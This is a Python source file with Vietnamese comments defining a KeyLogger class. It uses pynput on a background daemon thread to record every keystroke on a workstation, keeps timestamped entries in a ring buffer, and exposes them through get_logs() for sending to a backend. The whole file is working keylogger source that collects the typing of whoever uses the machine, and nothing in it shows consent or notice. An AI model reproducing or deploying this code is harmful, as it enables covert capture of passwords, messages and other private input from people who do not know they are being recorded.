"""
Keylogger Module - Ghi nhận phím bấm (chạy nền)

📌 CHỨC NĂNG:
- Ghi nhận tất cả phím bấm trên máy trạm (press)
- Phân biệt phím thường (chữ cái) và phím đặc biệt (Enter, Shift...)
- Lưu log vào bộ nhớ đệm (deque) với kích thước giới hạn
- Chạy trên thread riêng để không chặn luồng chính

🔁 LUỒNG HOẠT ĐỘNG:
1. start() → Tạo listener trên thread riêng, bắt đầu ghi nhận phím
2. Mỗi lần có phím bấm → _on_press() được gọi tự động
3. Log được lưu vào deque (tối đa max_logs bản ghi)
4. stop() → Dừng listener và giải phóng tài nguyên
5. get_logs() → Lấy toàn bộ log để gửi về backend

🛠️ CÔNG NGHỆ:
- pynput: Thư viện lắng nghe sự kiện bàn phím ở cấp hệ thống
- threading: Chạy listener trên daemon thread
- deque: Hàng đợi vòng tròn (tự động xóa cũ khi đầy)
"""

import threading
from pynput import keyboard
from datetime import datetime
from typing import Callable, Optional
from collections import deque


class KeyLogger:
    """
    Keylogger sử dụng pynput library với threading
    
    Ghi nhận phím bấm trên nền (background) mà không chặn luồng chính.
    Mỗi phím bấm được lưu kèm thời gian và loại (press/special).
    """
    
    def __init__(self, max_logs: int = 1000):
        """
        Khởi tạo keylogger
        
        Args:
            max_logs: Số lượng log tối đa trước khi tự động xóa cũ
                      (dùng deque để tự động quản lý)
        """
        self.logs = deque(maxlen=max_logs)  # Hàng đợi vòng tròn
        self.listener = None  # Keyboard listener (pynput)
        self.is_running = False
        self.on_key_callback: Optional[Callable] = None  # Callback khi có phím mới
    
    def _on_press(self, key):
        """
        Hàm callback được gọi mỗi khi có phím bấm
        
        Args:
            key: Đối tượng phím từ pynput
        
        Phân loại:
        - hasattr(key, 'char'): Phím thường (a, b, 1, Space...)
        - else: Phím đặc biệt (Key.enter, Key.shift, Key.ctrl_l...)
        """
        try:
            if hasattr(key, 'char'):
                # Phím thường (chữ, số, ký tự đặc biệt)
                self.logs.append({
                    'key': key.char,
                    'time': datetime.now(),
                    'type': 'press'
                })
            else:
                # Phím đặc biệt (Enter, Shift, Ctrl...)
                self.logs.append({
                    'key': str(key),  # Ví dụ: "Key.enter", "Key.shift"
                    'time': datetime.now(),
                    'type': 'special'
                })
            
            # Gọi callback nếu có (dùng để real-time update)
            if self.on_key_callback:
                self.on_key_callback(self.logs[-1])
        except Exception as e:
            print(f"Lỗi keylogger: {e}")
    
    def start(self):
        """Bắt đầu ghi nhận phím trên background thread"""
        if self.is_running:
            return  # Đã chạy rồi thì không start lại
        
        self.is_running = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        
        # Chạy listener trên daemon thread
        # Daemon = tự động tắt khi thread chính kết thúc
        thread = threading.Thread(target=self.listener.start, daemon=True)
        thread.start()
        print("✓ Keylogger started")
    
    def stop(self):
        """Dừng ghi nhận phím"""
        if self.listener:
            self.listener.stop()
            self.is_running = False
            print("✗ Keylogger stopped")
    
    def get_logs(self) -> list:
        """
        Lấy toàn bộ log đã ghi nhận
        
        Returns:
            List các dict log [{key, time, type}, ...]
        
        Chuyển deque thành list để gửi qua JSON
        """
        return list(self.logs)
    
    def clear_logs(self):
        """Xóa toàn bộ log"""
        self.logs.clear()


# Global instance
key_logger = KeyLogger()